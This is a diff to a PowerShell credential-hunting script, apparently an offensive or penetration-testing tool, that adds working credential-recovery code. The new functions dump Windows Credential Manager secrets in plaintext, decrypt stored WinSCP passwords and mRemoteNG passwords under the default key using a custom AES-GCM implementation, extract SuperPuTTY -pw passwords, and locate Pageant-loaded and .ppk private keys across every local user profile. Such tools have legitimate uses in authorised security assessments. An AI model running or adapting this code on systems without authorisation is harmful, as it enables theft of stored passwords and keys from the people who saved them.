@@ -125,7 +125,7 @@ param(
     [switch] $Help
 )
 
-$script:Version = '2.5.0'
+$script:Version = '2.6.0'
 
 # Minimalistic, Linux-style usage. Shown for -Help / -h and when the script is
 # run with no parameters at all. (Get-Help .\credshunter.ps1 still gives the full
@@ -2454,19 +2454,30 @@ function Test-KnownFile { param([string]$Path, [string]$Label)
 # FP filter would match. Saved sessions (PuTTY/KiTTY/WinSCP/RDP) are rare and
 # high-value; a silent miss (dropping a session that stores a password the
 # regex never recognised) is far worse than listing a handful of entries the
-# operator can eyeball. For each subkey we dump the host/user identity plus the
-# RAW value of any property whose NAME looks credential-bearing
+# operator can eyeball. For the container and each subkey we dump the host/user
+# identity plus the RAW value of any property whose NAME looks credential-bearing
 # (Password/Passphrase/Pwd/Secret/Cred/ProxyPassword/...). A stored secret field
 # -> [HIGH] with the raw value; an identity-only session -> [INTEREST] review.
 function Write-RegistrySessionReview { param([string]$Root, [string]$Tool)
     if (-not (Test-Path $Root)) { return }
     Add-Checked -Label "${Tool}_sessions" -Path $Root
     try {
-        Get-ChildItem -LiteralPath $Root -ErrorAction SilentlyContinue | ForEach-Object {
-            $sess = $_.PSChildName
+        # Some tools/lab fixtures store a session as a value directly on the
+        # Sessions key (name=zachary, data="plink ... -pw ...") instead of the
+        # usual Sessions\zachary\RemoteCommand layout. Inspect the container
+        # itself plus every descendant so both representations are covered.
+        $rootItem = Get-Item -LiteralPath $Root -ErrorAction SilentlyContinue
+        $sessionKeys = @()
+        if ($rootItem) { $sessionKeys += [PSCustomObject]@{ Key = $rootItem; IsRoot = $true } }
+        foreach ($childKey in @(Get-ChildItem -LiteralPath $Root -Recurse -ErrorAction SilentlyContinue)) {
+            $sessionKeys += [PSCustomObject]@{ Key = $childKey; IsRoot = $false }
+        }
+        foreach ($entry in $sessionKeys) {
+            $key = $entry.Key
+            $sess = if ($entry.IsRoot) { '<root-values>' } else { $key.PSChildName }
             try { $sess = [System.Uri]::UnescapeDataString($sess) } catch {}
-            $p = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction SilentlyContinue
-            if (-not $p) { return }
+            $p = Get-ItemProperty -LiteralPath $key.PSPath -ErrorAction SilentlyContinue
+            if (-not $p) { continue }
             $ident = @()
             foreach ($f in 'HostName','UserName','UsernameHint','PortNumber',
                            'ProxyHost','ProxyUsername','PublicKeyFile','PortForwardings') {
@@ -2506,15 +2517,15 @@ function Write-RegistrySessionReview { param([string]$Root, [string]$Tool)
             if ($secrets.Count -gt 0) {
                 # Bypass regex/FP filter entirely -- dump the raw stored value(s).
                 Add-Finding -Bucket High -Label "$Tool/stored_session_secret" `
-                    -Path $_.PSPath -LineNumber 0 -Preview (($base + '  ' + ($secrets -join '  ')).Trim())
+                    -Path $key.PSPath -LineNumber 0 -Preview (($base + '  ' + ($secrets -join '  ')).Trim())
             }
             if ($review.Count -gt 0) {
                 # Command stored in the session -- log the full string so the
                 # operator can manually check for embedded credentials.
                 Add-Finding -Bucket High -Label "$Tool/session_command_review" `
-                    -Path $_.PSPath -LineNumber 0 -Preview (($base + '  ' + ($review -join '  ')).Trim())
+                    -Path $key.PSPath -LineNumber 0 -Preview (($base + '  ' + ($review -join '  ')).Trim())
             }
-            if ($secrets.Count -eq 0 -and $review.Count -eq 0) {
+            if (-not $entry.IsRoot -and $secrets.Count -eq 0 -and $review.Count -eq 0) {
                 Add-Interesting -Category "${Tool}_session_review" -Path $base
             }
         }
@@ -2604,8 +2615,76 @@ function Test-PowerShellHistory {
     } catch {}
 }
 
+function Get-NativeCredentialEntries {
+    if (-not ('CredsHunter.NativeCredentials' -as [type])) {
+        try {
+            Add-Type -TypeDefinition @'
+using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+namespace CredsHunter {
+  public sealed class NativeCredentialEntry {
+    public string Target, UserName; public uint Type, Persist; public byte[] Blob;
+  }
+  public static class NativeCredentials {
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    struct CREDENTIAL {
+      public uint Flags, Type; public string TargetName, Comment; public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
+      public uint CredentialBlobSize; public IntPtr CredentialBlob; public uint Persist, AttributeCount; public IntPtr Attributes;
+      public string TargetAlias, UserName;
+    }
+    [DllImport("advapi32.dll", EntryPoint="CredEnumerateW", CharSet=CharSet.Unicode, SetLastError=true)]
+    static extern bool CredEnumerate(string Filter, uint Flags, out uint Count, out IntPtr Credentials);
+    [DllImport("advapi32.dll")] static extern void CredFree(IntPtr Buffer);
+    public static List<NativeCredentialEntry> Enumerate() {
+      var result = new List<NativeCredentialEntry>(); uint count; IntPtr array;
+      if (!CredEnumerate(null, 0, out count, out array)) return result;
+      try {
+        for (uint i=0; i<count; i++) {
+          IntPtr p = Marshal.ReadIntPtr(array, checked((int)i * IntPtr.Size));
+          CREDENTIAL c = (CREDENTIAL)Marshal.PtrToStructure(p, typeof(CREDENTIAL));
+          byte[] blob = new byte[c.CredentialBlobSize];
+          if (blob.Length > 0 && c.CredentialBlob != IntPtr.Zero) Marshal.Copy(c.CredentialBlob, blob, 0, blob.Length);
+          result.Add(new NativeCredentialEntry { Target=c.TargetName, UserName=c.UserName, Type=c.Type, Persist=c.Persist, Blob=blob });
+        }
+      } finally { CredFree(array); }
+      return result;
+    }
+  }
+}
+'@ -ErrorAction Stop
+        } catch { return @() }
+    }
+    try { return ,([CredsHunter.NativeCredentials]::Enumerate()) } catch { return @() }
+}
+
+function ConvertFrom-CredentialBlob { param([byte[]]$Blob)
+    if (-not $Blob -or $Blob.Length -eq 0 -or $Blob.Length -gt 4096) { return $null }
+    foreach ($encoding in @([Text.Encoding]::Unicode,[Text.Encoding]::UTF8)) {
+        try {
+            $value = $encoding.GetString($Blob).Trim([char]0)
+            if ($value.Length -lt 2 -or $value.Length -gt 512) { continue }
+            $printable = @($value.ToCharArray() | Where-Object { -not [char]::IsControl($_) -or $_ -in "`r","`n","`t" }).Count
+            if (($printable / [double]$value.Length) -ge 0.9) { return $value }
+        } catch {}
+    }
+    return $null
+}
+
 function Test-CmdkeyVault {
     Write-Info "Stage 1.5 - Windows credential vault / cmdkey"
+    # Locale-independent native enumeration. Generic credentials can expose a
+    # plaintext blob to their owning logon session; other types remain useful
+    # target/user metadata without pretending a password was recovered.
+    foreach ($entry in @(Get-NativeCredentialEntries)) {
+        $meta = "target=$($entry.Target) user=$($entry.UserName) type=$($entry.Type) persist=$($entry.Persist)"
+        $plain = ConvertFrom-CredentialBlob -Blob $entry.Blob
+        if (-not [string]::IsNullOrEmpty($plain) -and -not (Test-FalsePositive -Value $plain)) {
+            Add-Finding -Bucket High -Label 'credential_manager/plaintext_blob' -Path 'CredEnumerate' -LineNumber 0 -Preview "$meta password=$plain"
+        } else {
+            Add-Interesting -Category 'credential_manager_entry' -Path $meta
+        }
+    }
     # NOTE: this parse of `cmdkey /list` is LOCALE-DEPENDENT -- the "Target:" /
     # "User:" / "Type:" labels are localized, so on non-English hosts the block
     # split and User capture can miss. The robust, locale-independent alternative
@@ -2621,7 +2700,10 @@ function Test-CmdkeyVault {
                 if ($b -match 'User:\s*(.+)' -or $b -match 'Type:') {
                     $tgt = ($b -split "`r?`n" | Where-Object { $_ -match '\S' } | Select-Object -First 3) -join ' | '
                     if ($tgt) {
-                        Add-Finding -Bucket High -Label 'cmdkey/saved_credential' -Path 'cmdkey:list' -LineNumber 0 -Preview (Format-Preview $tgt)
+                        # cmdkey /list exposes only metadata/references; it does
+                        # not reveal a reusable password. Keep it for follow-up
+                        # without inflating the actionable HIGH count.
+                        Add-Interesting -Category 'cmdkey_saved_credential' -Path (Format-Preview $tgt)
                     }
                 }
             }
@@ -2667,6 +2749,26 @@ function Get-UserHiveRoots {
     $roots
 }
 
+function Get-WindowsUserProfilePaths {
+    # Return each local profile once. Targeted Stage-1 checks use this instead
+    # of assuming the process owner is the user who saved the credential.
+    $seen = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
+    $profiles = [System.Collections.Generic.List[string]]::new()
+    foreach ($candidate in @($env:USERPROFILE, (Join-Path $env:SystemDrive 'Users'))) {
+        if (-not $candidate) { continue }
+        if ($candidate -eq (Join-Path $env:SystemDrive 'Users')) {
+            try {
+                foreach ($dir in @(Get-ChildItem -LiteralPath $candidate -Directory -Force -ErrorAction SilentlyContinue)) {
+                    if ($seen.Add($dir.FullName)) { $profiles.Add($dir.FullName) }
+                }
+            } catch {}
+        } elseif ((Test-Path -LiteralPath $candidate -PathType Container) -and $seen.Add($candidate)) {
+            $profiles.Add($candidate)
+        }
+    }
+    return ,$profiles
+}
+
 function Test-PuTTYSessions {
     Write-Info "Stage 1.6 - PuTTY / KiTTY saved sessions"
     # Every saved session is listed for manual review (host/user + any
@@ -2682,21 +2784,116 @@ function Test-PuTTYSessions {
     }
 }
 
+function ConvertFrom-WinSCPPassword {
+    param([string]$Encrypted, [string]$UserName, [string]$HostName)
+    if ([string]::IsNullOrWhiteSpace($Encrypted) -or $Encrypted -notmatch '^[0-9A-Fa-f]+$' -or ($Encrypted.Length % 2)) { return $null }
+    $bytes = [System.Collections.Generic.List[byte]]::new()
+    try {
+        for ($i = 0; $i -lt $Encrypted.Length; $i += 2) {
+            $encoded = [Convert]::ToInt32($Encrypted.Substring($i, 2), 16)
+            $bytes.Add([byte]((-bnot ($encoded -bxor 0xA3)) -band 0xFF))
+        }
+    } catch { return $null }
+    $pos = 0
+    function Read-WinSCPByte {
+        if ($script:WinSCPDecodePos -ge $script:WinSCPDecodeBytes.Count) { throw 'truncated' }
+        return [int]$script:WinSCPDecodeBytes[$script:WinSCPDecodePos++]
+    }
+    $script:WinSCPDecodeBytes = $bytes
+    $script:WinSCPDecodePos = 0
+    try {
+        $flag = Read-WinSCPByte
+        if ($flag -eq 0xFF) {
+            $version = Read-WinSCPByte
+            if ($version -eq 0) { $length = Read-WinSCPByte }
+            elseif ($version -eq 2) { $length = ((Read-WinSCPByte) -shl 8) + (Read-WinSCPByte) }
+            else { return $null } # external/master-password protected
+        } else { $length = $flag }
+        $shift = Read-WinSCPByte
+        $script:WinSCPDecodePos += $shift
+        if ($length -lt 0 -or ($script:WinSCPDecodePos + $length) -gt $bytes.Count) { return $null }
+        $plainBytes = $bytes.GetRange($script:WinSCPDecodePos, $length).ToArray()
+        $plain = [Text.Encoding]::UTF8.GetString($plainBytes)
+        if ($flag -eq 0xFF) {
+            $key = [string]$UserName + [string]$HostName
+            if (-not $plain.StartsWith($key, [StringComparison]::Ordinal)) { return $null }
+            $plain = $plain.Substring($key.Length)
+        }
+        return $plain
+    } catch { return $null }
+    finally {
+        Remove-Variable WinSCPDecodeBytes -Scope Script -ErrorAction SilentlyContinue
+        Remove-Variable WinSCPDecodePos -Scope Script -ErrorAction SilentlyContinue
+    }
+}
+
+function Test-WinSCPRegistryPasswords { param([string]$Root)
+    if (-not (Test-Path -LiteralPath $Root)) { return }
+    foreach ($sessionKey in @(Get-ChildItem -LiteralPath $Root -Recurse -ErrorAction SilentlyContinue)) {
+        try {
+            $p = Get-ItemProperty -LiteralPath $sessionKey.PSPath -ErrorAction Stop
+            $user = [string]$p.UserName; $hostName = [string]$p.HostName
+            if (-not $user -or -not $hostName -or -not $p.Password) { continue }
+            $plain = ConvertFrom-WinSCPPassword -Encrypted ([string]$p.Password) -UserName $user -HostName $hostName
+            if (-not [string]::IsNullOrEmpty($plain) -and -not (Test-FalsePositive -Value $plain)) {
+                Add-Finding -Bucket High -Label 'winscp/decrypted_session_password' -Path $sessionKey.PSPath `
+                    -LineNumber 0 -Preview ("session={0} host={1} username={2} password={3}" -f $sessionKey.PSChildName,$hostName,$user,$plain)
+            }
+        } catch {}
+    }
+}
+
+function Test-WinSCPIniPasswords { param([string]$FullPath)
+    try { $lines = [IO.File]::ReadAllLines($FullPath) } catch { return }
+    $section = ''; $values = @{}
+    $flush = {
+        if ($script:WinSCPIniSection -notmatch '^(?i:Sessions\\)' -or -not $script:WinSCPIniValues['Password']) { return }
+        $user = [Uri]::UnescapeDataString([string]$script:WinSCPIniValues['UserName'])
+        $hostName = [Uri]::UnescapeDataString([string]$script:WinSCPIniValues['HostName'])
+        $plain = ConvertFrom-WinSCPPassword -Encrypted ([string]$script:WinSCPIniValues['Password']) -UserName $user -HostName $hostName
+        if (-not [string]::IsNullOrEmpty($plain) -and -not (Test-FalsePositive -Value $plain)) {
+            Add-Finding -Bucket High -Label 'winscp/decrypted_ini_password' -Path $FullPath -LineNumber 0 `
+                -Preview ("section={0} host={1} username={2} password={3}" -f $script:WinSCPIniSection,$hostName,$user,$plain)
+        }
+    }
+    $script:WinSCPIniSection = ''; $script:WinSCPIniValues = @{}
+    try {
+        foreach ($line in $lines) {
+            if ($line -match '^\[(?<section>[^]]+)\]\s*$') {
+                & $flush
+                $script:WinSCPIniSection = $Matches['section']; $script:WinSCPIniValues = @{}
+            } elseif ($line -match '^(?<key>[^=;#]+)=(?<value>.*)$') {
+                $script:WinSCPIniValues[$Matches['key'].Trim()] = $Matches['value'].Trim()
+            }
+        }
+        & $flush
+    } finally {
+        Remove-Variable WinSCPIniSection -Scope Script -ErrorAction SilentlyContinue
+        Remove-Variable WinSCPIniValues -Scope Script -ErrorAction SilentlyContinue
+    }
+}
+
 function Test-WinSCPSessions {
     Write-Info "Stage 1.7 - WinSCP saved sessions"
     # Every saved session listed for manual review; the (encrypted) Password
     # field is dumped raw so it can be decrypted offline (winscppasswd, etc.).
-    Write-RegistrySessionReview -Root 'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions' -Tool 'winscp'
-    foreach ($d in @($env:APPDATA, $env:LOCALAPPDATA, $env:USERPROFILE)) {
-        if (-not $d) { continue }
-        try {
-            Get-ChildItem -LiteralPath $d -Recurse -Force -Filter 'WinSCP.ini' -ErrorAction SilentlyContinue |
-                Select-Object -First 5 |
-                ForEach-Object {
-                    Add-Interesting -Category 'winscp_ini' -Path $_.FullName
-                    Invoke-ScanFile -FullPath $_.FullName -SourceLabel 'winscp_ini'
-                }
-        } catch {}
+    foreach ($hive in Get-UserHiveRoots) {
+        $sessionsRoot = "$hive\Software\Martin Prikryl\WinSCP 2\Sessions"
+        Write-RegistrySessionReview -Root $sessionsRoot -Tool 'winscp'
+        Test-WinSCPRegistryPasswords -Root $sessionsRoot
+    }
+    foreach ($profile in Get-WindowsUserProfilePaths) {
+        foreach ($f in @(
+            (Join-Path $profile 'WinSCP.ini')
+            (Join-Path $profile 'AppData\Roaming\WinSCP.ini')
+            (Join-Path $profile 'AppData\Local\WinSCP.ini')
+            (Join-Path $profile 'Documents\WinSCP.ini')
+        )) {
+            if (-not (Test-Path -LiteralPath $f -PathType Leaf)) { continue }
+            Add-Interesting -Category 'winscp_ini' -Path $f
+            Test-WinSCPIniPasswords -FullPath $f
+            Invoke-ScanFile -FullPath $f -SourceLabel 'winscp_ini'
+        }
     }
 }
 
@@ -3077,14 +3274,19 @@ function Test-RDPSavedSessions {
 
 function Test-RemoteAccessManagers {
     Write-Info "Stage 1.19 - mRemoteNG / Devolutions / Royal TS / KiTTY / Pidgin"
-    # mRemoteNG (default master key 'mR3m', AES -- flag the file)
-    foreach ($f in @(
-        (Join-Path $env:APPDATA 'mRemoteNG\confCons.xml')
-        (Join-Path $env:APPDATA 'mRemoteNG\confCons.xml.bak')
-    )) {
-        if (Test-Path -LiteralPath $f) {
-            Add-Interesting -Category 'mremoteng_session' -Path $f
-            Invoke-ScanFile -FullPath $f -SourceLabel 'mremoteng'
+    # mRemoteNG configs across local profiles. Default-key encrypted values are
+    # recovered when the platform crypto supports their mode; custom-key files
+    # remain explicit encrypted leads.
+    foreach ($profile in Get-WindowsUserProfilePaths) {
+        foreach ($f in @(
+            (Join-Path $profile 'AppData\Roaming\mRemoteNG\confCons.xml')
+            (Join-Path $profile 'AppData\Roaming\mRemoteNG\confCons.xml.bak')
+        )) {
+            if (Test-Path -LiteralPath $f) {
+                Add-Interesting -Category 'mremoteng_session' -Path $f
+                Invoke-MRemoteNGConfigReview -FullPath $f
+                Invoke-ScanFile -FullPath $f -SourceLabel 'mremoteng'
+            }
         }
     }
     # Devolutions Remote Desktop Manager
@@ -3120,6 +3322,177 @@ function Test-RemoteAccessManagers {
     }
     # KiTTY sessions (PuTTY fork with a stored Password field) are enumerated
     # in Stage 1.6 (Test-PuTTYSessions) via Write-RegistrySessionReview.
+
+    # SuperPuTTY legacy registry sessions and current Sessions.XML databases.
+    foreach ($hive in Get-UserHiveRoots) {
+        Write-RegistrySessionReview -Root "$hive\Software\Jim Radford\SuperPuTTY\Sessions" -Tool 'superputty'
+    }
+    foreach ($profile in Get-WindowsUserProfilePaths) {
+        foreach ($root in @(
+            (Join-Path $profile 'AppData\Roaming\SuperPuTTY')
+            (Join-Path $profile 'Documents\SuperPuTTY')
+        )) {
+            if (-not (Test-Path -LiteralPath $root)) { continue }
+            try {
+                Get-ChildItem -LiteralPath $root -Recurse -Depth 6 -Force -Filter 'Sessions.XML' -ErrorAction SilentlyContinue |
+                    Select-Object -First 20 | ForEach-Object {
+                        Add-Interesting -Category 'superputty_sessions' -Path $_.FullName
+                        Invoke-SuperPuTTYConfigReview -FullPath $_.FullName
+                    }
+            } catch {}
+        }
+    }
+}
+
+function Initialize-CredsHunterGcm {
+    if ('CredsHunter.AesGcmCompat' -as [type]) { return $true }
+    try {
+        Add-Type -TypeDefinition @'
+using System;
+using System.Security.Cryptography;
+namespace CredsHunter {
+  public static class AesGcmCompat {
+    static void Xor(byte[] a, byte[] b) { for (int i=0;i<16;i++) a[i]^=b[i]; }
+    static byte[] Mul(byte[] x, byte[] y) {
+      byte[] z=new byte[16], v=(byte[])y.Clone();
+      for(int i=0;i<128;i++) {
+        if ((x[i/8] & (1 << (7-(i%8)))) != 0) Xor(z,v);
+        bool lsb=(v[15]&1)!=0;
+        for(int j=15;j>0;j--) v[j]=(byte)((v[j]>>1)|((v[j-1]&1)<<7));
+        v[0]>>=1; if(lsb) v[0]^=0xE1;
+      }
+      return z;
+    }
+    static void Block(ICryptoTransform enc, byte[] input, byte[] output) { enc.TransformBlock(input,0,16,output,0); }
+    static void Put64(byte[] b,int o,ulong n) { for(int i=7;i>=0;i--){b[o+i]=(byte)n;n>>=8;} }
+    static void GHashData(byte[] h, byte[] data, ref byte[] y) {
+      for(int o=0;o<data.Length;o+=16) {
+        byte[] block=new byte[16]; int n=Math.Min(16,data.Length-o); Buffer.BlockCopy(data,o,block,0,n);
+        Xor(y,block); y=Mul(y,h);
+      }
+    }
+    static byte[] GHash(byte[] h, byte[] aad, byte[] cipher) {
+      byte[] y=new byte[16]; GHashData(h,aad,ref y); GHashData(h,cipher,ref y);
+      byte[] len=new byte[16]; Put64(len,0,(ulong)aad.Length*8); Put64(len,8,(ulong)cipher.Length*8);
+      Xor(y,len); return Mul(y,h);
+    }
+    static byte[] J0(byte[] h, byte[] nonce) {
+      if(nonce.Length==12){byte[] j=new byte[16];Buffer.BlockCopy(nonce,0,j,0,12);j[15]=1;return j;}
+      byte[] y=new byte[16];GHashData(h,nonce,ref y);byte[] len=new byte[16];Put64(len,8,(ulong)nonce.Length*8);Xor(y,len);return Mul(y,h);
+    }
+    static void Inc32(byte[] b){for(int i=15;i>=12;i--){if(++b[i]!=0)break;}}
+    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] cipher, byte[] tag, byte[] aad) {
+      using(Aes aes=Aes.Create()) { aes.Mode=CipherMode.ECB;aes.Padding=PaddingMode.None;aes.Key=key;
+        using(ICryptoTransform enc=aes.CreateEncryptor()) {
+          byte[] h=new byte[16];Block(enc,new byte[16],h);byte[] j=J0(h,nonce);
+          byte[] s=GHash(h,aad,cipher), ej=new byte[16];Block(enc,j,ej);
+          int diff=tag.Length==16?0:1;for(int i=0;i<16 && i<tag.Length;i++)diff|=(ej[i]^s[i])^tag[i];if(diff!=0)return null;
+          byte[] plain=new byte[cipher.Length], ctr=(byte[])j.Clone();int off=0;
+          while(off<cipher.Length){Inc32(ctr);byte[] stream=new byte[16];Block(enc,ctr,stream);int n=Math.Min(16,cipher.Length-off);for(int i=0;i<n;i++)plain[off+i]=(byte)(cipher[off+i]^stream[i]);off+=n;}
+          return plain;
+        }
+      }
+    }
+  }
+}
+'@ -ErrorAction Stop
+        return $true
+    } catch { return $false }
+}
+
+function ConvertFrom-MRemoteNGSecret {
+    param([string]$Encrypted, [string]$Mode = 'GCM', [int]$Iterations = 1000, [string]$MasterKey = 'mR3m')
+    try { $data = [Convert]::FromBase64String($Encrypted) } catch { return $null }
+    try {
+        if ($Mode -match '^(?i:CBC|Legacy)$') {
+            if ($data.Length -le 16) { return $null }
+            $md5 = [Security.Cryptography.MD5]::Create()
+            try { $key = $md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($MasterKey)) } finally { $md5.Dispose() }
+            $aes = [Security.Cryptography.Aes]::Create()
+            try {
+                $aes.Mode = [Security.Cryptography.CipherMode]::CBC
+                $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
+                $aes.Key = $key; $aes.IV = $data[0..15]
+                $plain = $aes.CreateDecryptor().TransformFinalBlock($data, 16, $data.Length - 16)
+                return [Text.Encoding]::UTF8.GetString($plain)
+            } finally { $aes.Dispose() }
+        }
+        if ($Mode -notmatch '^(?i:GCM)$' -or $data.Length -le 48) { return $null }
+        $salt = [byte[]]$data[0..15]; $nonce = [byte[]]$data[16..31]
+        $cipher = [byte[]]$data[32..($data.Length-17)]; $tag = [byte[]]$data[($data.Length-16)..($data.Length-1)]
+        $kdf = New-Object Security.Cryptography.Rfc2898DeriveBytes($MasterKey, $salt, $Iterations)
+        try { $key = $kdf.GetBytes(32) } finally { $kdf.Dispose() }
+        if (-not (Initialize-CredsHunterGcm)) { return $null }
+        $plain = [CredsHunter.AesGcmCompat]::Decrypt($key,$nonce,$cipher,$tag,$salt)
+        if (-not $plain) { return $null }
+        return [Text.Encoding]::UTF8.GetString($plain)
+    } catch { return $null }
+}
+
+function Invoke-MRemoteNGConfigReview { param([string]$FullPath)
+    try { [xml]$xml = [IO.File]::ReadAllText($FullPath) } catch { return }
+    $root = $xml.DocumentElement
+    if (-not $root) { return }
+    $mode = if ($root.BlockCipherMode) { [string]$root.BlockCipherMode } else { 'CBC' }
+    $iterations = 1000; if ($root.KdfIterations -as [int]) { $iterations = [int]$root.KdfIterations }
+    $foundEncrypted = $false
+    foreach ($node in @($xml.SelectNodes('//*'))) {
+        foreach ($attrName in @('Password','RDGatewayPassword','RDPGatewayPassword','VNCProxyPassword','SSHProxyPassword')) {
+            $attr = $node.Attributes[$attrName]
+            if (-not $attr -or [string]::IsNullOrWhiteSpace($attr.Value)) { continue }
+            $foundEncrypted = $true
+            $plain = ConvertFrom-MRemoteNGSecret -Encrypted $attr.Value -Mode $mode -Iterations $iterations
+            if (-not [string]::IsNullOrEmpty($plain) -and -not (Test-FalsePositive -Value $plain)) {
+                $identity = @($node.Attributes['Name'].Value,$node.Attributes['Hostname'].Value,$node.Attributes['Username'].Value) | Where-Object { $_ }
+                Add-Finding -Bucket High -Label 'mremoteng/decrypted_default_key' -Path $FullPath -LineNumber 0 `
+                    -Preview ((($identity -join ' ') + " $attrName=$plain").Trim())
+            }
+        }
+    }
+    if ($foundEncrypted) { Add-Interesting -Category 'ENCRYPTED_CREDENTIAL_LEAD/mremoteng_config' -Path $FullPath }
+}
+
+function Invoke-SuperPuTTYConfigReview { param([string]$FullPath)
+    try { [xml]$xml = [IO.File]::ReadAllText($FullPath) } catch { return }
+    foreach ($node in @($xml.SelectNodes('//*'))) {
+        $args = [string]$node.Attributes['ExtraArgs'].Value
+        if ($args -notmatch '(?i)(?:^|\s)-pw(?:\s+|=)(?:"(?<pw>[^"]+)"|''(?<pw>[^'']+)''|(?<pw>\S+))') { continue }
+        $pw = $Matches['pw']; if (Test-FalsePositive -Value $pw) { continue }
+        $identity = @($node.Attributes['SessionName'].Value,$node.Attributes['Host'].Value,$node.Attributes['Username'].Value) | Where-Object { $_ }
+        Add-Finding -Bucket High -Label 'superputty/plaintext_password' -Path $FullPath -LineNumber 0 `
+            -Preview ((($identity -join ' ') + " password=$pw").Trim())
+    }
+    Invoke-ScanFile -FullPath $FullPath -SourceLabel 'superputty'
+}
+
+function Get-PageantPpkReferences { param([string]$CommandLine)
+    $refs = [System.Collections.Generic.List[string]]::new()
+    foreach ($m in [regex]::Matches([string]$CommandLine, '(?i)(?:"(?<p>[^"]+[.]ppk)"|(?<p>\S+[.]ppk))')) {
+        if ($m.Groups['p'].Value) { $refs.Add($m.Groups['p'].Value) }
+    }
+    return $refs.ToArray()
+}
+
+function Test-PageantArtifacts {
+    Write-Info 'Stage 1.19b - Pageant loaded/referenced private keys'
+    try {
+        foreach ($proc in @(Get-CimInstance Win32_Process -Filter "Name='pageant.exe'" -ErrorAction SilentlyContinue)) {
+            Add-Interesting -Category 'pageant_agent_running' -Path ("pid={0} command={1}" -f $proc.ProcessId,$proc.CommandLine)
+            foreach ($keyPath in Get-PageantPpkReferences -CommandLine ([string]$proc.CommandLine)) {
+                Add-Interesting -Category 'pageant_loaded_key_reference' -Path $keyPath
+                if (Test-Path -LiteralPath $keyPath -PathType Leaf) { Add-Guaranteed -Extension 'ppk' -Path $keyPath }
+            }
+        }
+    } catch {}
+    foreach ($profile in Get-WindowsUserProfilePaths) {
+        foreach ($root in @((Join-Path $profile '.ssh'),(Join-Path $profile 'Desktop'),(Join-Path $profile 'Documents'),(Join-Path $profile 'AppData\Roaming\PuTTY'))) {
+            if (-not (Test-Path -LiteralPath $root)) { continue }
+            try {
+                Get-ChildItem -LiteralPath $root -Recurse -Depth 5 -Force -Filter '*.ppk' -File -ErrorAction SilentlyContinue |
+                    Select-Object -First 100 | ForEach-Object { Add-Guaranteed -Extension 'ppk' -Path $_.FullName }
+            } catch {}
+        }
+    }
 }
 
 function Test-WiFiProfileXmls {
@@ -3489,6 +3862,7 @@ function Invoke-SystemChecks {
     Invoke-Stage1Check { Test-SSHKeysWindows }
     Invoke-Stage1Check { Test-RDPSavedSessions }
     Invoke-Stage1Check { Test-RemoteAccessManagers }
+    Invoke-Stage1Check { Test-PageantArtifacts }
     Invoke-Stage1Check { Test-WiFiProfileXmls }
     Invoke-Stage1Check { Test-AutopilotProvisioning }
     Invoke-Stage1Check { Test-StickyNotes }
@@ -3793,12 +4167,23 @@ function Test-CleanNoisePath {
         $p -match '/[.]buildserver/system/caches/pluginsdslcache/' -or
         $p -match '[.]jar($|[:( ])' -or
         $p -match '/usr/share/[^/]+/lib/.*[.](zip|whl)($|[:( ])' -or
-        $p -match '/credshunter[.](sh|ps1)(:|$)') { return $true }
+        # Installed Cloudbase-Init Python runtime/library source is vendor
+        # code, not host configuration. Its conf directory remains visible.
+        $p -match '/program files/cloudbase solutions/cloudbase-init/python/(?:lib|scripts)/' -or
+        # Browsers commonly save downloads as credshunter[1].ps1.
+        $p -match '/credshunter(?:\[[0-9]+\])?[.](?:sh|ps1)(:|$)') { return $true }
     if ($IncludePackageCaches -and (
         $p -match '/var/lib/gems/[0-9.]+/cache/' -or
         $p -match '^/etc/apt/trusted[.]gpg([.]d/|$)' -or
         $p -match '^/usr/share/keyrings/')) { return $true }
     return $false
+}
+
+function Test-CleanNoiseGuaranteed { param([object]$Finding)
+    $p = ([string]$Finding.Path).Replace('\','/').ToLowerInvariant()
+    # OneDrive log directories contain files named general.keystore that are
+    # internal logging state, not Java/application credential keystores.
+    return ($p -match '/appdata/local/microsoft/onedrive/logs/.*/general[.]keystore$')
 }
 
 function Test-CleanCommentedFinding { param([object]$Finding)
@@ -3973,11 +4358,23 @@ function Test-CleanNoiseInterest {
     if ($Finding.Category -eq 'CREDENTIAL_LEAD/zip_container' -and
         $p -match '/program files(?: [(]x86[)])?/microsoft/(?:edge|edgecore|edgewebview)/') { return $true }
 
+    # Installed Edge MSIX/MSIXBundle payloads under per-user application trees
+    # and their ResiliencyLinks copies are product packages, not user backups.
+    if ($Finding.Category -eq 'CREDENTIAL_LEAD/zip_container' -and
+        $p -match '/appdata/local/microsoft/(?:edgecore|edgewebview)/(?:application/)?') { return $true }
+
+    # OneDrive logs/settings are dominated by telemetry gzip/SQLite caches.
+    # Cloud/SaaS tokens are intentionally outside this scanner's scope.
+    if ($p -match '/appdata/local/microsoft/onedrive/' -and
+        $Finding.Category -in @('CREDENTIAL_LEAD/gzip_container','CREDENTIAL_LEAD/sqlite_container','CREDENTIAL_LEAD/zip_container','high_value_file')) { return $true }
+
     if ($Finding.Category -ne 'high_value_file') { return $false }
     # CMS distributions commonly ship gzip-precompressed static assets for
     # direct web-server delivery. They are not backup archives and contain the
     # same public CSS/JS already present beside them.
     if ($p -match '[.](?:css|js|mjs|map|svg|woff2?|ttf|eot)[.]gz$') { return $true }
+    if ($p -match '/appdata/local/iconcache[.]db$' -or
+        $p -match '[.](?:exe|dll)(?:[.]jscid)?[.]old$') { return $true }
     if ($p -match '/pandora_console/(?:include/functions_events[.]php[.]orig|mobile/include/style/main[.]css[.]old)$') { return $true }
     # Prefer a specific classification (for example browser_credentials) over
     # the generic extension-based high_value_file entry for the same path.
@@ -4110,7 +4507,9 @@ function Write-CleanSummary {
         if ($f.Preview) { Write-CleanLine ("         $($script:CD){0}$($script:CNC)" -f $f.Preview) }
     }
 
-    $containers = @($script:Guaranteed | Sort-Object Extension, Path)
+    $containers = @($script:Guaranteed | Where-Object {
+        -not (Test-CleanNoiseGuaranteed -Finding $_)
+    } | Sort-Object Extension, Path)
     Write-CleanFindings -Title "Credential containers" -Items $containers -Renderer {
         param($g)
         Write-CleanLine ("  $($script:CR)[CRITICAL]$($script:CNC) {0,-8} {1}" -f $g.Extension, $g.Path)
